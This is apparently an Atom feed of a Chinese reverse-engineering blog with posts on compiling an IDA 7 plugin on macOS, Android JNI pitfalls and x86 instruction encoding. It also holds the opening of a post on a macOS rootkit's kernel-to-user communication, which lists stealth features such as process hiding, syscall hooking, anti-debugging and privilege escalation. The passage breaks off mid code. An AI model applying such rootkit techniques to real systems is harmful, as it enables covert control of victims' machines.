    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Android JNI踩坑笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_%E6%8E%89%E5%9D%91%E7%AC%94%E8%AE%B0%20/JNI/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_掉坑笔记 /JNI/</id>
    <published>2017-11-28T09:00:20.000Z</published>
    <updated>2017-11-29T03:29:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。</p></blockquote></blockquote><h3 id="坑1–jni方法签名分号问题"><a href="#坑1–jni方法签名分号问题" class="headerlink" title="坑1–jni方法签名分号问题"></a>坑1–jni方法签名分号问题</h3><p>这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jmethodID equals_id = env-&gt;GetMethodID(string_c, <span class="string">"equals"</span>, <span class="string">"(Ljava/lang/Object;)Z"</span>);</div></pre></td></tr></table></figure><p>切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jmethodID iterator_id = env-&gt;GetMethodID(list_c,<span class="string">"iterator"</span>,<span class="string">"()Ljava/util/Iterator;"</span>);</div></pre></td></tr></table></figure><p>这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。</p><h3 id="坑2–原生方法包含默认2个参数"><a href="#坑2–原生方法包含默认2个参数" class="headerlink" title="坑2–原生方法包含默认2个参数"></a>坑2–原生方法包含默认2个参数</h3><p>这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> jboolean <span class="title">nativeFunction</span><span class="params">(JNIEnv *env, jobject content, jobject someObj)</span></span>&#123;...&#125;</div></pre></td></tr></table></figure><p>第一个保留参数为<code>JNIEnv</code>虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。</p><p>由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。</p><p>这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。</p><h3 id="坑3—jni调用父类方法的正确姿势"><a href="#坑3—jni调用父类方法的正确姿势" class="headerlink" title="坑3—jni调用父类方法的正确姿势"></a>坑3—jni调用父类方法的正确姿势</h3><p>这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找<code>Exception</code>这个类的<code>getStackTrace</code></p><p>方法时提示方法找不到错误，调了会才发现这个方法是在其父类<code>Throwable</code>中，所以正确的写法为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">jclass exception_c = env-&gt;FindClass(<span class="string">"java/lang/Exception"</span>);</div><div class="line">jclass throwable_c = env-&gt;FindClass(<span class="string">"java/lang/Throwable"</span>);</div><div class="line">jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, <span class="string">"getStackTrace"</span>,<span class="string">"()[Ljava/lang/StackTraceElement;"</span>);</div></pre></td></tr></table></figure><p>那么怎么调用呢？用<code>CallNonvirtual&lt;XXX&gt;Method</code>去调用父类中的方法，一个调用例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id);</div></pre></td></tr></table></figure><p>这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。</p><h3 id="坑4—其他小坑"><a href="#坑4—其他小坑" class="headerlink" title="坑4—其他小坑"></a>坑4—其他小坑</h3><p>写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如<code>jstring</code>与<code>char*</code>的转换，<code>LOGE()</code>函数中参数为<code>char*</code>的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下<code>jni.h</code>头文件就能找到。</p><p>还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的<code>build.gradle</code>文件中在<code>defaultConfig{}</code>加入下面的脚本：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sourceSets.main&#123;</div><div class="line">    jni.srcDirs  '/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include'</div><div class="line">    jniLibs.srcDir '/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib'</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>无非是手动指定了jni相关的文件路径。</p><p>关于下面两类写法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jclass exception_c = env-&gt;FindClass(<span class="string">"java/lang/Exception"</span>);</div></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jclass exception_c = (*env)-&gt;FindClass(env, <span class="string">"java/lang/Exception"</span>);</div></pre></td></tr></table></figure><p>原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。</p><p>继续踩坑去了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>X86指令编码笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86指令编码笔记/X86指令编码笔记/</id>
    <published>2017-10-11T03:46:13.000Z</published>
    <updated>2017-10-16T04:09:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。</p></blockquote><h3 id="x86指令编码格式"><a href="#x86指令编码格式" class="headerlink" title="x86指令编码格式"></a>x86指令编码格式</h3><p>很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。</p><p>x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了<code>Intel 64</code>和<code>IA-32</code>架构下的指令格式，当然，这两种架构所采用的都是x86指令编码：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F.png?raw=true" alt="指令编码格式"></p><p>从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。</p><h3 id="指令prefix"><a href="#指令prefix" class="headerlink" title="指令prefix"></a>指令prefix</h3><p>prefix简单的说来就是调整内存操作数属性，增强指令的作用等。</p><ul><li><p><code>lock</code> 和 <code>repeat</code></p><p>其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。</p></li><li><p><code>operand-size override</code> （<strong>66H </strong>— 改变默认操作数大小）</p><p>这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/operand_size_override.png?raw=true" alt="operand_size_override"></p></li><li><p><code>address-size override</code> （<strong>67H</strong> — 改变默认操作数地址大小）</p><p>这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/address_override.png?raw=true" alt="address_override"></p></li><li><p><code>segment override</code>，<code>branch hints</code> 和 <code>bound</code></p><p>其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。</p><p>​</p><p>| 2E          | 3E          | 26          | 64          | 65          | 36          |<br>| ———– | ———– | ———– | ———– | ———– | ———– |<br>| CS register | DS register | ES register | FS register | GS register | SS register |</p></li></ul><h4 id="REX-prefix—开启-64-位计算的基石"><a href="#REX-prefix—开启-64-位计算的基石" class="headerlink" title="REX prefix—开启 64 位计算的基石"></a>REX prefix—开启 64 位计算的基石</h4><p>REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个）</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>0</td><td>W</td><td>R</td><td>X</td><td>B</td></tr></tbody></table><ul><li>W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size</li><li>R: 用来扩展 ModRM.reg 域</li><li>X: 用来扩展 SIB.index 域</li><li>B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg</li></ul><h5 id="寄存器编码表"><a href="#寄存器编码表" class="headerlink" title="寄存器编码表"></a>寄存器编码表</h5><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/register_table.png?raw=true" alt="register_table"></p><p>下面来分析这条指令：</p><p><code>mov eax,ebx</code></p><p>正常编码为：<code>89 d8</code>  下面看看在不同的<code>REX.W</code>和<code>66H prefix</code>下的不同：</p><ul><li><p><code>48 89 d8</code>——————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 48 89 d8</code>—————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 40 89 d8</code>—————&gt; <code>mov ax, bx</code></p><p>​</p></li></ul><p>第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，<strong>REX.W = 1</strong></p><p>第 2 条指令编码加上了 <strong>66H prefix</strong> 同时还有 REX prefix（<strong>REX.W = 1</strong>），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？<br>实际上，很简单！<strong>48H 位于 66H 后面，66H 将被覆盖！</strong>也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 <strong>operand size 是 64 位</strong>的。</p><p>第 3 条指令编码也同样使用了 <strong>66H prefix </strong>和 <strong>REX prefix</strong>，但是 <strong>REX.W = 0</strong> 意味着不改变原来的 operand size！<br>在这种情况下，<strong>REX prefix 不会与 66H prefix 产生冲突</strong>，最终的作用于 66H prefix，因此 <strong>operand size 是 16 位</strong>的。</p><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。</p><p>一个opcode可以由一个byte组成，我们称之为<code>1-byte opcode</code>，当然，与之对应的，就有<code>2-bytes opcode</code>和<code>3-bytes opcode</code>。其中，后两者一般会有一个被称为<code>escape opcode</code>的byte进行引导，该byte的数值是<code>0FH</code>。所以，一般情况下，<code>2-bytes opcode</code>就是<code>0FH</code>后面再加一个byte，而<code>3-bytes opcode</code>就是<code>0FH</code>后面再加两个bytes。</p><h3 id="ModR-M"><a href="#ModR-M" class="headerlink" title="ModR/M"></a>ModR/M</h3><p>ModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。</p><p>由一个byte组成，其格式如下：</p><table><thead><tr><th>7 6</th><th>5 4 3</th><th>2 1 0</th></tr></thead><tbody><tr><td>mod</td><td>reg</td><td>R/M</td></tr></tbody></table><p><strong>1、mod：寻址模式。</strong><br>　　2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。</p><ul><li>mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式：</li></ul><ul><li>mod = 00，定义 [register] 间接寻址，无displacement值。</li><li>mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。</li><li>mod = 10，定义 [register + disp32]，有32位displacement偏移值。</li></ul><p><strong>2、reg：寄存器ID值</strong><br>　　3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。</p><p>reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。</p><p><strong>3、r/m：意即register / memory。</strong></p><p>​     提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。</p><blockquote><p>注意:</p><p>(1) 如果像这条指令：mov eax, [eax+ecx<em>2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+index</em>scale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。<br>　　原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。</p><p>(2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。<br>　　Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。</p></blockquote><h3 id="SIB"><a href="#SIB" class="headerlink" title="SIB"></a>SIB</h3><p>SIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。</p><table><thead><tr><th>7-6</th><th>5-4-3</th><th>2-1-0</th></tr></thead><tbody><tr><td>scale</td><td>index</td><td>base</td></tr></tbody></table><p>index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。</p><h3 id="Displacement-和-Immediate"><a href="#Displacement-和-Immediate" class="headerlink" title="Displacement 和 Immediate"></a>Displacement 和 Immediate</h3><p>某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。</p><h3 id="综合起来，看下面的例子："><a href="#综合起来，看下面的例子：" class="headerlink" title="综合起来，看下面的例子："></a>综合起来，看下面的例子：</h3><ul><li><p><code>49 8b 7d 00</code></p><p>49=0100 1001对应REX prefix,默认64为size模式</p><p>8b= mov opcode</p><p>7d=01 111 101—&gt;ModR/M   mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13</p><p>00=Displacement = 0</p><p>所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13]</p><p>​</p></li></ul><h3 id="参考及索引"><a href="#参考及索引" class="headerlink" title="参考及索引"></a>参考及索引</h3><p><a href="http://ref.x86asm.net/coder32.html" target="_blank" rel="external">http://ref.x86asm.net/coder32.html </a>—-&gt; 查阅opcode</p><p><a href="http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png" target="_blank" rel="external">http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png</a> —&gt;quick look</p><p><a href="http://sparksandflames.com/files/x86InstructionChart.html" target="_blank" rel="external">Intel x86 Assembler Instruction Set Opcode Table</a></p><p><a href="http://www.mouseos.com/x64/index.html" target="_blank" rel="external">http://www.mouseos.com/x64/index.html</a></p><p><a href="https://bbs.pediy.com/thread-78121.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-78121.htm</a></p><p><a href="http://ytliu.info/blog/2016/12/10/x86zhi-ling-bian-ma-de-na-xie-shi-er/" target="_blank" rel="external">X86指令编码的那些事儿</a></p><p><a href="http://subler.github.io/note/compiler/x86_instruction_encode.html" target="_blank" rel="external">http://subler.github.io/note/compiler/x86_instruction_encode.html</a></p><p><a href="https://www.onlinedisassembler.com/odaweb/strcpy_x86" target="_blank" rel="external">onlineDisassembler</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;x86指令编码格式&quot;&gt;&lt;a href=&quot;#x86指令编码格式&quot; class=&quot;headerlink&quot; title=&quot;x86指令编码格式
      
    
    </summary>
    
      <category term="杂" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/%E6%9D%82/"/>
    
    
      <category term="x86" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>一种用户层与kext内核扩展交互方式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/</id>
    <published>2017-08-10T07:59:00.000Z</published>
    <updated>2017-08-10T10:34:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。<br>简单说下rootKit原理：<br>利用kext驻留在内核，完成实际的各种功能：<br><code>sys_ptrace</code>过滤 <code>PT_DENY_ATTACH</code>反调试<br>hook系统调用防止<code>sys_kil</code>（很强大有木有）<br>隐藏自身进程，文件监控，网络监控，提权等等<br>可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。</p></blockquote></blockquote><h3 id="0x01-一个例子进入kext开发"><a href="#0x01-一个例子进入kext开发" class="headerlink" title="0x01 一个例子进入kext开发"></a>0x01 一个例子进入kext开发</h3><p>在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。</p><p>打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;mach/mach_types.h&gt;</div><div class="line">#include &lt;libkern/libkern.h&gt;</div><div class="line"></div><div class="line">kern_return_t TestExtension_stop(kmod_info_t *ki, void *d);</div><div class="line">kern_return_t TestExtension_start(kmod_info_t * ki, void *d)</div><div class="line">&#123;</div><div class="line">    printf(&quot;hello kext!\n&quot;);</div><div class="line">    return KERN_SUCCESS;</div><div class="line">&#125;</div><div class="line">kern_return_t TestExtension_stop(kmod_info_t *ki, void *d)</div><div class="line">&#123;</div><div class="line">    printf(&quot;bye kext!\n&quot;);</div><div class="line">    return KERN_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。</p><p>简单编译一下，然后找到编译后的kext文件，输入命令改变权限</p><p><code>sudo chown -R root:wheel TestExtension.kext</code></p><p>再输入  </p><p><code>sudo kextload TestExtension.kext</code></p><p>加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令</p><p><code>sudo kextunload TestExtension.kext</code></p><p>来卸载该内核扩展，你同样会看到bye kext这句话。</p><h3 id="0x02-用户层与内和扩展间的交互"><a href="#0x02-用户层与内和扩展间的交互" class="headerlink" title="0x02 用户层与内和扩展间的交互"></a>0x02 用户层与内和扩展间的交互</h3><p>下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用<code>PF_SYSTEM</code>协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。</p><h4 id="kext-示例代码"><a href="#kext-示例代码" class="headerlink" title="kext 示例代码"></a>kext 示例代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div 